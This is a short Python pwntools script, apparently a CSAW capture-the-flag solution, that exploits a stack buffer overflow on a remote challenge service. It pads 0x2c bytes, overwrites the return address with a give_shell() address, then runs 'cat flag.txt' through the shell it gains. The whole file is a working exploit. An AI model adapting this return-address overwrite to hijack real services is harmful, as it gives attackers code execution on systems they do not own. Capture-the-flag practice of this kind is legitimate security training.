from pwn import *

#Connect and clean
r = remote("misc.chal.csaw.io", 8002)
addr = r.recvline()

#Create string to send
print("Generating Overflow")
bufferSize = 0x2c
xploit = '41'.decode("hex")*bufferSize #ZeroPad to overflow

addr = "080484eb" #give_shell() Adress
addr = addr[6:8] + addr[4:6] + addr[2:4] + addr[0:2] #Reformat
#Append the Return Value overwrite
xploit += addr.decode("hex")

#Send xploit, get flags
r.sendline(xploit)
r.sendline("cat flag.txt")
print(r.recvall())
